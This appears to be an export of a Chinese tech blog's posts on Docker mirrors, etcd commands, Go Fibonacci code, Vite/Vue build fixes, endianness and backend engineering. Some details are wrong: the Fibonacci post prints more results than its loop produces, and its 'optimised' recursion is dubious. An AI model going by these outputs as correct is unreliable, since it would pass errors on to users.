<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">docker pull registry.docker-<span class="keyword">cn</span>.<span class="keyword">com</span>/myname/myrepo:mytag</span><br></pre></td></tr></table></figure>

<p>示例如下：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">docker</span> pull registry.docker-cn.com/library/ubuntu:<span class="number">18</span>.<span class="number">04</span></span><br></pre></td></tr></table></figure>

<h2 id="阿里云镜像源地址使用"><a href="#阿里云镜像源地址使用" class="headerlink" title="阿里云镜像源地址使用"></a>阿里云镜像源地址使用</h2><ul>
<li>注册后登陆阿里云账号</li>
<li>进入控制台，选择容器镜像服务</li>
<li>输入密码以便获取凭证</li>
<li>进入镜像中心，选择镜像加速器</li>
<li>根据操作文档中，不同操作系统执行不同操作</li>
</ul>
<h2 id="Ubuntu18-04-LTS-配置阿里云镜像"><a href="#Ubuntu18-04-LTS-配置阿里云镜像" class="headerlink" title="Ubuntu18.04 LTS 配置阿里云镜像"></a>Ubuntu18.04 LTS 配置阿里云镜像</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">sudo <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://tesijcui.mirror.aliyuncs.com&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Docker</category>
      </categories>
  </entry>
  <entry>
    <title>服务发现系统 Etcd</title>
    <url>/2022/02/service-etcd/</url>
    <content><![CDATA[<h2 id="etcd概述"><a href="#etcd概述" class="headerlink" title="etcd概述"></a>etcd概述</h2><p>一个分布式，可信赖的键值对存储，用于分布式系统的最重要数据。</p>
<h2 id="etcd特点"><a href="#etcd特点" class="headerlink" title="etcd特点"></a>etcd特点</h2><span id="more"></span>

<ul>
<li>读取和写入数据使用标准的HTTP工具，比如curl</li>
<li>将数据存储在分层组织的目录中，例如标准文件系统</li>
<li>监听指定的键或者目录，并对值的变化做出相应的应对</li>
<li>可以使用SSL客户端证书进行通讯</li>
<li>基准测试可以在一秒内可以完成1000次写入</li>
<li>可以通过TTL来设置键的过期时间</li>
<li>使用Raft协议来保证一致性</li>
</ul>
<h2 id="安装使用"><a href="#安装使用" class="headerlink" title="安装使用"></a>安装使用</h2><ul>
<li><p>直接下载编译后的可执行文件进行安装，下载地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2V0Y2QtaW8vZXRjZC9yZWxlYXNlcw==">https://github.com/etcd-io/etcd/releases<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget https:<span class="regexp">//gi</span>thub.com<span class="regexp">/etcd-io/</span>etcd<span class="regexp">/releases/</span>download<span class="regexp">/v3.4.7/</span>etcd-v3.<span class="number">4.7</span>-linux-amd64.tar.gz</span><br><span class="line">tar xzvf etcd-v3.<span class="number">4.7</span>-linux-amd64.tar.gz &amp;&amp; cd etcd-v3.<span class="number">4.7</span>-linux-amd64</span><br><span class="line">./etcd --versio</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用apt安装包管理工具安装</p>
<figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line">apt install etcd-<span class="keyword">server</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="etcd命令行接口使用"><a href="#etcd命令行接口使用" class="headerlink" title="etcd命令行接口使用"></a>etcd命令行接口使用</h2><p>设置一个key的value</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl -s http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">2379</span><span class="regexp">/v2/</span>keys/message -X PUT -d value=<span class="string">&quot;Hello etcd&quot;</span> |jq .</span><br></pre></td></tr></table></figure>

<p>改变一个key的value</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl -s http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">2379</span><span class="regexp">/v2/</span>keys/message -X PUT -d value=<span class="string">&quot;Hello raft&quot;</span> |jq .</span><br></pre></td></tr></table></figure>

<p>获取一个key的value</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl -s http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">2379</span><span class="regexp">/v2/</span>keys/message |jq .</span><br></pre></td></tr></table></figure>

<p>删除一个key节点</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl -s http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">2379</span><span class="regexp">/v2/</span>keys/message -X DELETE |jq .</span><br></pre></td></tr></table></figure>

<p>使用ttl设置key的生命周期，超过这个时间点该值没有被访问，就删除这个key</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">curl</span> -s http://<span class="number">127.0.0.1:2379</span>/v2/keys/foo -X PUT -d value=bar -d ttl=<span class="number">5</span> |jq .</span><br></pre></td></tr></table></figure>

<h2 id="应用场景一：服务发现（Service-Discovery）"><a href="#应用场景一：服务发现（Service-Discovery）" class="headerlink" title="应用场景一：服务发现（Service Discovery）"></a>应用场景一：服务发现（Service Discovery）</h2><p>服务发现要解决的也是分布式系统中最常见的问题之一，即在同一个分布式集群中的进程或服务，要如何才能找到对方并建立连接。本质上来说，服务发现就是想要了解集群中是否有进程在监听udp或tcp端口，并且通过名字就可以查找和连接。</p>
<h2 id="应用场景二：消息发布与订阅"><a href="#应用场景二：消息发布与订阅" class="headerlink" title="应用场景二：消息发布与订阅"></a>应用场景二：消息发布与订阅</h2><p>在分布式系统中，最适用的一种组件间通信方式就是消息发布与订阅。</p>
<p>即构建一个配置共享中心，数据提供者在这个配置中心发布消息，而消息使用者则订阅他们关心的主题，一旦主题有消息发布，就会实时通知订阅者。</p>
<p>通过这种方式可以做到分布式系统配置的集中式管理与动态更新。</p>
<h2 id="应用场景三：分布式通知与协调"><a href="#应用场景三：分布式通知与协调" class="headerlink" title="应用场景三：分布式通知与协调"></a>应用场景三：分布式通知与协调</h2><p>这里说到的分布式通知与协调，与消息发布和订阅有些相似。都用到了etcd中的Watcher机制，通过注册与异步通知机制，实现分布式环境下不同系统之间的通知与协调，从而对数据变更做到实时处理。</p>
<h2 id="应用场景四：分布式锁"><a href="#应用场景四：分布式锁" class="headerlink" title="应用场景四：分布式锁"></a>应用场景四：分布式锁</h2><p>因为etcd使用Raft算法保持了数据的强一致性，某次操作存储到集群中的值必然是全局一致的，所以很容易实现分布式锁。锁服务有两种使用方式，一是保持独占，二是控制时序。</p>
]]></content>
      <categories>
        <category>Etcd</category>
      </categories>
  </entry>
  <entry>
    <title>什么是斐波那契数列，还有优化？</title>
    <url>/2022/02/fibonacci-sequence/</url>
    <content><![CDATA[<h2 id="什么是斐波拉契数列-Fibonaccisequence"><a href="#什么是斐波拉契数列-Fibonaccisequence" class="headerlink" title="什么是斐波拉契数列(Fibonaccisequence)"></a>什么是斐波拉契数列(Fibonaccisequence)</h2><p>斐波那契数列（Fibonacci sequence），又称黄金分割数列，因数学家莱昂纳多·斐波那契（Leonardo Fibonacci）以兔子繁殖为例子而引入，故又称为“兔子数列”，指的是这样一个数列：1、1、2、3、5、8、13、21、34、……</p>
<span id="more"></span>

<h2 id="使用Golang递归实现斐波拉契数列"><a href="#使用Golang递归实现斐波拉契数列" class="headerlink" title="使用Golang递归实现斐波拉契数列"></a>使用Golang递归实现斐波拉契数列</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">fibonacci</span><span class="params">(n <span class="type">int</span>)</span></span> (r <span class="type">int</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">2</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fibonacci(n<span class="number">-1</span>) + fibonacci(n<span class="number">-2</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%d, &quot;</span>, fibonacci(i))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到结果：</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">55</span>, </span><br></pre></td></tr></table></figure>

<h2 id="斐波拉契数列的递归实现优化"><a href="#斐波拉契数列的递归实现优化" class="headerlink" title="斐波拉契数列的递归实现优化"></a>斐波拉契数列的递归实现优化</h2><p>由于上述代码使用了两次递归，为减少递归次数，对递归代码优化如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">advanceFibonacii</span><span class="params">(n <span class="type">int</span>)</span></span> (r <span class="type">int</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">2</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    result := <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">2</span>; n &gt; i; n-- &#123;</span><br><span class="line">	result += advanceFibonacii(n - <span class="number">2</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;%d, &quot;</span>, advanceFibonacii(i))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到结果</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">21</span>, <span class="number">34</span>, <span class="number">55</span>, </span><br></pre></td></tr></table></figure>

<h2 id="斐波那契数列的应用"><a href="#斐波那契数列的应用" class="headerlink" title="斐波那契数列的应用"></a>斐波那契数列的应用</h2><ul>
<li>算法<ul>
<li>斐波那契堆</li>
<li>欧几里得算法的时间复杂度</li>
</ul>
</li>
<li>物理学：氢原子能级问题</li>
<li>自然界：植物的生长</li>
<li>波浪理论与股市</li>
<li>斐波那契螺旋</li>
<li>建筑学</li>
<li>据说一个小男孩参考斐波那契数列发明了太阳能电池树</li>
<li>斐波那契螺旋形的摇椅</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>斐波那契数列非常重要，所有关于数学的书几乎都会提到。</p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
  </entry>
  <entry>
    <title>使用Vite构建Vue踩坑记录</title>
    <url>/2022/10/vite-build-vue/</url>
    <content><![CDATA[<h4 id="一、解决npm下载慢或者下载不了的问题"><a href="#一、解决npm下载慢或者下载不了的问题" class="headerlink" title="一、解决npm下载慢或者下载不了的问题"></a>一、解决npm下载慢或者下载不了的问题</h4><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置淘宝镜像的地址</span></span><br><span class="line">$ npm config set registry http:<span class="comment">//registry.npm.taobao.org</span></span><br><span class="line"><span class="comment">// 查看当前的下载地址</span></span><br><span class="line">$ npm config get registry</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<h4 id="二、Vite跨域配置"><a href="#二、Vite跨域配置" class="headerlink" title="二、Vite跨域配置"></a>二、Vite跨域配置</h4><p>在Vite官网有这样一段配置可以设置跨域的地址</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title function_">defineConfig</span>(&#123;</span><br><span class="line">  <span class="attr">server</span>: &#123;</span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="comment">// 字符串简写写法</span></span><br><span class="line">      <span class="string">&#x27;/foo&#x27;</span>: <span class="string">&#x27;http://localhost:4567&#x27;</span>,</span><br><span class="line">      <span class="comment">// 选项写法</span></span><br><span class="line">      <span class="string">&#x27;/api&#x27;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&#x27;http://jsonplaceholder.typicode.com&#x27;</span>,</span><br><span class="line">        <span class="attr">changeOrigin</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">rewrite</span>: <span class="function">(<span class="params">path</span>) =&gt;</span> path.<span class="title function_">replace</span>(<span class="regexp">/^/</span>api/, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">      &#125;,</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>Vite官网解决方案链接：cn.vitejs.dev&#x2F;config&#x2F;serv…</p>
<h4 id="三、Vite打包只有runtime模式"><a href="#三、Vite打包只有runtime模式" class="headerlink" title="三、Vite打包只有runtime模式"></a>三、Vite打包只有runtime模式</h4><p>在开发阶段Vite的打包速度远大于Webpack，这是因为Webpack先打包再启动开发服务器。而Vite直接启动开发服务器，然后按需编译依赖文件。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">new Vue(&#123;</span><br><span class="line">    el: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">    router,</span><br><span class="line">    components: &#123; App &#125;,</span><br><span class="line">    template: <span class="string">&#x27;&lt;App/&gt;&#x27;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>需要修改为</p>
<figure class="highlight coffeescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    el: <span class="string">&#x27;#app&#x27;</span>,</span><br><span class="line">    router,</span><br><span class="line">    components: &#123; App &#125;,</span><br><span class="line">    render: <span class="function"><span class="params">(h)</span> =&gt;</span> h(App)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h4 id="四、使用require-动态导入图片报错和解决方法"><a href="#四、使用require-动态导入图片报错和解决方法" class="headerlink" title="四、使用require()动态导入图片报错和解决方法"></a>四、使用require()动态导入图片报错和解决方法</h4><p>这是因为Vite使用Typescript开发，但是Typescript不支持require，最后会出require is not defined这样的错误。</p>
<figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">return</span> <span class="title">require</span><span class="params">(<span class="string">&quot;../../assets/img/user.png&quot;</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<p>需要修改为</p>
<figure class="highlight haxe"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="type">URL</span>(<span class="string">&quot;../../assets/img/user.png&quot;</span>, <span class="keyword">import</span>.meta.url);</span><br></pre></td></tr></table></figure>
<p>Vite官网解决方案链接：cn.vitejs.dev&#x2F;guide&#x2F;asset…</p>
<h4 id="五、加载JSON文件，解析JSON失败"><a href="#五、加载JSON文件，解析JSON失败" class="headerlink" title="五、加载JSON文件，解析JSON失败"></a>五、加载JSON文件，解析JSON失败</h4><p>出现failed to parse json这样问题的时候，是因为JSON文件需要完整的原数据格式，不需要类似的注释、export、包装等。</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">module.exports</span> = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="string">&quot;hello&quot;</span>:<span class="string">&quot;world&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>需要修改为</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[&#123;    <span class="string">&quot;hello&quot;</span>:<span class="string">&quot;world&quot;</span>  &#125;]</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Javascript</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>Vite</tag>
      </tags>
  </entry>
  <entry>
    <title>什么是字节序？ Big-Endian vs Little-Endian 举例说明</title>
    <url>/2022/03/big-little-endian/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>计算机只理解二进制。这意味着 0 和 1 构成了计算机使用的语言。</p>
<p>一位是 0 或 1 。8 位组成一个字节。从这些简单的部分，我们可以构建极其复杂的连接计算机系统来渲染视频、显示来自世界各地的文本并计算极其复杂的算法。</p>
<span id="more"></span>

<p>一些数据（一些英文字符，如 a、e、i、o 和 u）可以用一个字节表示，但有些数据需要多个字节来表示。</p>
<p>但是<strong>字节顺序</strong>是计算机如何读取和理解字节的基本部分。</p>
<h2 id="什么是字节序？"><a href="#什么是字节序？" class="headerlink" title="什么是字节序？"></a>什么是字节序？</h2><p>不同的语言以不同的顺序阅读他们的文本。例如，英语从左到右阅读，而阿拉伯语从右到左阅读。</p>
<p>这正是计算机的字节序。</p>
<p>如果我的计算机从左到右读取字节，而您的计算机从右到左读取，那么当我们需要通信时就会出现问题。</p>
<p>字节序意味着计算机内存中的字节按一定顺序读取。</p>
<p>如果我们永远不需要共享信息，我们就不会有任何问题。每台计算机对于它们自己的数据都是内部一致的。只是互联网使我们能够共享比以往更多的数据，而且我们的数据并不总是以相同的顺序读取。</p>
<p>Endianness以两种方式表示Big-endian ( BE ) 和Little-endian ( LE )。</p>
<ul>
<li>BE先存储大端。当读取多个字节时，第一个字节（或最低的内存地址）是最大的 - 所以对于从左到右阅读的人来说最有意义。</li>
<li>LE首先存储小端。当读取多个字节时，第一个字节（或最低的内存地址）是最小的 - 所以对于从右到左阅读的人来说最有意义。</li>
</ul>
<p>如果上述内容没有意义，那没关系，让我们看一个例子。</p>
<h2 id="字节顺序如何工作的示例"><a href="#字节顺序如何工作的示例" class="headerlink" title="字节顺序如何工作的示例"></a>字节顺序如何工作的示例</h2><p>让我们取一个我们必须使用多个字节来表示的数字，并展示 它可以表示的大端和小端方式。</p>
<p>我们将采用一个需要三个字节才能以二进制表示的数字。</p>
<p>这可能稍微简化了它，但我希望它可以作为一个有用的视觉解释。</p>
<p><img src="/images/2022/up-fe28e0c2a824e027799ed6a3073e57738e8.webp" alt="binary example" title="binary example"></p>
<blockquote>
<p>一个二进制示例，其中 big-endian 和 little-endian 数字按读取顺序排列。</p>
</blockquote>
<p>开头的 0b 只是为了让读者知道它是二进制的。所以我们知道二进制 1100 和十进制数 1,100 之间的区别（一千，一百）。我还使用了颜色希望使它更清晰。</p>
<p>我只是想明确一点，位排序很好。位的顺序没有区别。但是字节的正确顺序是有区别的。我希望以上演示了一个字节内 0 和 1 的顺序不要改变。但是<strong>字节顺序</strong>确实发生了变化。</p>
<p>如果我们也只需要发送一个字节，就没有问题（没有多种方法可以只订购一件东西）。这只是一个多于一个字节的序列的问题。</p>
<h2 id="最高有效字节-MSbyte"><a href="#最高有效字节-MSbyte" class="headerlink" title="最高有效字节 (MSbyte)"></a>最高有效字节 (MSbyte)</h2><p>术语最高有效字节是描述<strong>字节顺序</strong>的常用方法，因此我想确保彻底涵盖它。</p>
<p>在我们开始解释bits和bytes之前， 让我们用十进制数来做。</p>
<p>如果我取十进制数 2,984，你可以改变什么数字来改变最小的数量？答案是个位数 4. 如果我把 4 改成 5，整数只会增加 1。</p>
<p>但是，假设您将最高位 2 更改在 2,984 中。它将显着改变数字并增加一千。</p>
<p>这与bytes和bits完全相同。</p>
<p>我们将保持最小位置的字节称为最低有效字节( LSbyte )，将保持最小位置的位称为最低有效位( LSbit )。</p>
<p><img src="/images/2022/up-102fe8a780fd29a97b8532d8624b0e19107.webp" alt="ms byte" title="ms byte"></p>
<blockquote>
<p>一个图表来说明包含最低位置编号的字节是最低有效字节。</p>
</blockquote>
<p>保存最高有效位的字节称为最高有效字节( MSbyte )，保存最高有效位位置的位称为最高有效位( MSbit )。</p>
<p>现在知道了这个新定义，我们可以将BE和LE定义为：</p>
<ul>
<li>Big endian先存储数据MSbyte</li>
<li>Little endian最后存储数据MSbyte</li>
</ul>
<h2 id="这什么时候会成为问题？"><a href="#这什么时候会成为问题？" class="headerlink" title="这什么时候会成为问题？"></a>这什么时候会成为问题？</h2><p>在一些不同的情况下，字节序必须是计算中的一个考虑因素。</p>
<p>例如，Unicode 字符（用于在您的手机、PC、电视等任何地方呈现字符的字符集！）必须传递一个特殊的字符字节序列 (U+FEFF BYTE ORDER MARK)，称为Byte Order Mark或BOM。BOM有几个用途。</p>
<p>BOM使系统知道：</p>
<ul>
<li>传入的流是 Unicode。</li>
<li>其中使用了 Unicode 字符编码。</li>
<li>传入流的字节序。</li>
</ul>
<p>一些编程语言甚至希望您详细说明正在使用的<strong>字节顺序</strong>。因此，一个程序可以根据您的需要使用、发送和接收BE或LE中的数字。</p>
<h2 id="为什么这首先是一个问题-？"><a href="#为什么这首先是一个问题-？" class="headerlink" title="为什么这首先是一个问题 ？"></a>为什么这首先是一个问题 ？</h2><p>碰巧出现了不同的协议，然后不得不相互交互。BE是任何网络协议中的主导顺序，例如称为网络顺序。 另一方面，大多数 PC 都是little-endian的。</p>
<p>您可以在此处在线运行 <span class="exturl" data-url="aHR0cDovL2NwcC5zaC81MjR3aQ==">C++<i class="fa fa-external-link-alt"></i></span> 代码片段，以查看您的机器是什么字节序（我的是little-endian）。</p>
<p>字节序在很大程度上不再对高级语言产生影响，并且抽象出我们不需要担心的特定实现细节。</p>
<p>它的另一部分是处理器决定它们是小端还是大端（或者可以同时处理两者 - 称为Bi-endian），因此消费者选择驱动了我们认为计算机系统中“正常”的部分内容。</p>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>我希望这篇文章已经解释了字节序是什么，什么是大字节序和小字节序，并且你现在更清楚地理解了这些概念。</p>
]]></content>
      <categories>
        <category>DataStructure</category>
      </categories>
  </entry>
  <entry>
    <title>如何成为一名优秀的后端工程师</title>
    <url>/2022/11/career-backend/</url>
    <content><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>我担任后端工程师已超过 8 年，我见证了技术的来来去去，但有一点始终不变；就是该技术建立的第一个原则。我指的并不是工具、框架甚至语言。这些不断发展和变化，但构建这些工具的基础设施很少发生变化。</p>
<p>例如，知道如何设置 Apache 或 IIS 是一回事，了解这两个 Web 服务器之间的共性和差异是另一回事。</p>
<span id="more"></span>

<p>在这篇文章中，我探讨了后端工程的一些基础知识，它们是我们使用的一切的基础。您可以选择对所有这些基础知识有基本的了解并成为一名万事通的后端工程师，或者选择更深入的垂直领域并成为该领域的专家。没有对错之分，全看是什么打动了你。</p>
<p>成为更好的后端工程师的方法从来都不是一帆风顺的。事实上，它很混乱，充满了只有你必须经历的反复试验和试验。没有一本书、没有课程、没有 YouTube 视频或媒体文章可以教你关于后端工程的一切。你必须自己去体验。</p>
<p>如果您是一名对后端工程感兴趣的应届毕业生，您可能会发现这些基础知识中的一个或多个很有趣，并决定继续学习。</p>
<p>最好的方法是弄脏你的手。让我们开始吧。</p>
<h2 id="通信协议"><a href="#通信协议" class="headerlink" title="通信协议"></a>通信协议</h2><p>通信协议将前端连接接到后端。了解协议的工作原理对于工程师来说是一项很好的技能，尤其是当他们想要构建一个有弹性的后端应用程序时。</p>
<p>我们在后端使用和喜爱的几乎所有协议都构建在 TCP 或 UDP 之上。这就是为什么了解这两者之间的差异有助于工程师做出正确选择的原因。例如，TCP 是一种基于流的面向连接的协议，而 UDP 是一种基于消息的无连接协议。TCP 以连接建立和重新传输为代价提供可靠的传送。虽然 UDP 启动速度更快但不能保证交付。在这两个协议之上构建的任何东西都必须遵守它们的基本属性。TCP并不比UDP好，UDP也不比TCP好。这完全取决于您要构建的内容。</p>
<p>往上看，HTTP 协议最初是建立在 TCP 之上的，因为我们想要可靠地发送请求和响应。随着网络的发展和资源的丰富，一个连接不足以同时发送多个请求。因此浏览器开始建立越来越多的连接，每个请求的连接设置成本变得如此之高。</p>
<p>HTTP&#x2F;2 引入了应用程序级流，因此可以在同一链接上发送多个请求。后来 HTTP&#x2F;2 发展起来，不得不用 HTTP&#x2F;3 在 UDP 之上重写，以解决 TCP 线头问题。一切都是有原因的，TCP 的基本特性是这一举动的罪魁祸首。这并不意味着 TCP 不好，网络已经以 TCP 的方式不再适用发展。如果我们不知道 TCP 是如何工作的，我们就不会改进 HTTP 协议。</p>
<p>同样重要的是要知道使用任何协议都会带来成本，尤其是在构建 API 时。了解该成本将帮助您做出更明智的决策。例如，使用 HTTP&#x2F;2 可能会给您带来更多的 HTTP 请求吞吐量，但应用程序组装流所需的工作会对 CPU 造成负担，这是 Lucidchart 在艰难的过程中学到的东西。</p>
<p>有时后端架构需要实时双向通信协议来构建聊天、游戏应用程序或仅在两个服务之间进行通信。可以使用 WebSockets、GRPC 或原始 TCP&#x2F;UDP 等协议。如果您知道协议的工作原理以及优点和缺点，您就会知道何时使用它。</p>
<p>最终，学习通信协议对于后端工程师来说很重要，并且可以根据需要深入了解任何协议。也许有一天你会写一个 RFC 来提议一个新的协议。</p>
<h2 id="网络服务器"><a href="#网络服务器" class="headerlink" title="网络服务器"></a>网络服务器</h2><p>Web 服务器变得越来越重要，因为后端基础设施依赖于 HTTP Web 通信。Web 服务器提供基于 HTTP 协议的静态或动态内容。如果您构建 Web API，您可以使用您选择的语言启动您自己的 Web 服务器，或者使用 Gin、Express 或 Django 等 Web 框架。</p>
<p>现代 Web 服务器同时支持 HTTP&#x2F;1.1 和 HTTP&#x2F;2。HTTP&#x2F;3 作为其较新的协议正在慢慢获得支持。使用适当的协议配置 Web 服务器对于后端应用程序的性能和弹性至关重要；而这一切都取决于环境。例如，您是否期望来自同一个客户端的多个并发请求？还是您希望请求较少但来自许多客户？基于此，您可以选择多路复用 HTTP&#x2F;2 或普通简单的 HTTP&#x2F;1.1。</p>
<p>Web 服务器的内部架构也可能不同。Web 服务器可以是单线程或多线程的。它们可以有一个线程或多个侦听器线程。可以通过多种方式在线程之间接收和分配客户端连接。如果您选择现成的 Web 服务器，您将受困于它的架构。如果您从头开始构建自己的架构，则可以选择适合您的架构。</p>
<p>此外，Web 服务器可以设置堆栈中的任何位置。例如，CDN 是一个 Web 服务器，它充当缓存并与原始后端 Web 服务器通信以获取内容。API 网关是一种 Web 服务器，用于对用户进行身份验证并提供来自后端 Web 服务器的 API 响应。</p>
<p>现成的 Web 服务器的示例有 Apache Tomcat、Apache httpd 和 Nginx。后者既可以充当 Web 服务器，也可以充当代理。您可以通过侦听 TCP 端口并了解如何使用 HTTP 协议，以任何语言构建您自己的 Web 服务器，您当然可以使用为您完成大部分工作的 HTTP 库。</p>
<h2 id="数据库工程"><a href="#数据库工程" class="headerlink" title="数据库工程"></a>数据库工程</h2><p>数据库工程是一个广阔的研究领域。数据库的核心思想很简单；允许多个用户以持久的方式一致地存储和检索数据。这就是为什么理解 ACID 的四个属性：原子性、一致性、隔离性和持久性是数据库工程的基础。</p>
<p>人们必须明白，没有什么是一成不变的，遵循这些属性并不是必须的。例如，关系数据库是完全 ACID 并且需要模式，而 MongoDB 是作为基于文档的数据库构建的，具有基本的原子性（文档级别）并且没有模式。Redis 通过默认牺牲持久性来构建一个静态的高性能缓存。</p>
<p>没有索引的数据库系统是不完整的，其核心 B+树是首选的数据结构。数据在表格、文档或图表中的组织方式最终都会成为文件系统页面。了解如何获得大部分磁盘 I&#x2F;O 读取是数据库工程的核心。</p>
<p>如果你对数据库工程感兴趣，那么你可以专攻的领域很多。你可以选择一个数据库，然后对它了如指掌。您可以构建更好的索引技术（LSM 是一个很好的例子）。您可以构建专门用于特定工作负载的新数据库系统。</p>
<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>代理在工程界越来越受欢迎，尤其是随着微服务的引入。代理的主要目的是它接收来自客户端的请求并将请求转发到后端服务器。代理向目标服务器隐藏原始客户端的网络层身份。</p>
<p>有两个级别的代理：第 4 层和第 7 层代理。第 4 层代理工作在传输层，而第 7 层代理工作在应用层。每一层都提供不同的功能，可以用于不同的目的。第 7 层代理要求代理了解应用程序协议，而第 4 层代理可与任何应用程序协议一起工作，因为它工作在传输层（TCP 或 UDP）。</p>
<p>您可能听说过可互换使用的正向代理和反向代理。正向代理和反向代理都接收来自客户端的请求并将请求转发到后端。在正向代理中，客户端明确请求特定的后端服务器，代理完成此请求。转发代理必须在客户端网络代理部分配置才能工作。在反向代理中客户端并不知道最终的后端服务器，对于客户端来说最终的目的地就是反向代理。客户端不知道后端有更多的服务器。</p>
